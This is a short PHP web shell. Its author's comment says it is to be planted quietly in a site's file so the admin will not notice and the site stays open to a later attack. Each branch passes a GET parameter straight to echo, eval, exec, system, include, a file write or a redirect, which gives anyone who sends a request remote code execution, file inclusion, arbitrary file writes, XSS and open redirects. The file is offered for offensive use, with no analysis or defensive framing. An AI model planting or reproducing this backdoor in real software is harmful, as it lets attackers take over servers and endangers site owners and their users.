<?php
/* 
Coded By: Zech Bron
Github: https://github.com/ZechBron
Github Code: https://github.com/ZechBron/Crying-PHP
Description:
	Vulnerable PHP Codes to put inside a file (but do not modify that file to avoid the admin discoveringg what you've done) for future attack.
	Note that the only purpose of this code is to insert this shit in a file to make the site vulnerable for your future attack.
*/
// XSS - Redirect, and other stuff
if (isset($_GET['xzz'])) {
	echo $_GET['xzz'];
}
// Eval
elseif (isset($_GET['zeval'])) {
	eval($_GET['zeval']);
}
elseif (isset($_GET['zexec'])) {
	exec($_GET['zexec']);
}
// Sys
elseif (isset($_GET['zsys'])) {
	system($_GET['zsys']);
}
// File Inclusion
elseif (isset($_GET['zfile'])) {
	include $_GET['zfile'];	
}
// Write File
elseif (isset($_GET['zfilename']) && isset($_GET['zcontent'])) {
	$zCh = fopen($_GET['zfilename'], "a");
	fwrite($zCh, $_GET['zcontent']);
	fclose($zCh);
}
// Header Hacking
elseif (isset($_GET['zheader'])) {
	header("Location: " . $_GET['zheader']);
}


?>
